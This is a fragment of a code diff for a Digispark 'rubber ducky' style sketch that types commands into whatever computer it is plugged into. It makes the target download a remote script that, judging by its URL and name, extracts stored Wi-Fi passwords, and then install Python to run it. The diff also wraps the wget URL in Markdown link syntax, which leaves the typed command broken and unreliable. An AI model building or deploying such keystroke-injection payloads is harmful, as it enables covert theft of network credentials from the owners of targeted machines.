@@ -96,7 +96,7 @@ void setup() {
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1000);
   
-  DigiKeyboard.print("wget https://github.com/wifi_passwords/linux.py -O /tmp/linux.py\n"); // Download linux.py
+  DigiKeyboard.print("wget [https://github.com/wifi_passwords/linux.py](https://gitlab.com/dileepkumarkoppula_iot/usb-rubber-ducky/extract-wi-fi-passwords-from-linux/-/blob/main/linux.py) -O /tmp/linux.py\n"); // Download linux.py
   DigiKeyboard.delay(15000);
   
   DigiKeyboard.print("sudo apt install python3 -y\n"); // Install Python
